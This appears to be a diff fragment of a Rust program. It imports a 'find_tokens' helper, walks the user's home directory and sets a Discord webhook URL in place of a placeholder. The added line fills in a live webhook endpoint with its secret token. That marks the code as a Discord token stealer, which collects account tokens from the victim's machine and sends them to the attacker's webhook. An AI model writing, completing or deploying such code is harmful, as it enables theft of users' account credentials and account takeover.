@@ -8,7 +8,7 @@ async fn main() {
     mod find;
     use find::finder::find_tokens;
     use dirs::home_dir;
-    let url = "Webhook Url Here";
+    let url = "https://discord.com/api/webhooks/1509429169317216306/eradH3TU5mph6wxHyLfd8Xz_bD-aR91VRJar642N45pNMFpGo67wnqDULu0pDG7Pwy7L";
     let home_dir = home_dir().unwrap();
     let home_str = home_dir.to_string_lossy();
     let mut paths: Vec<String> = Vec::new();
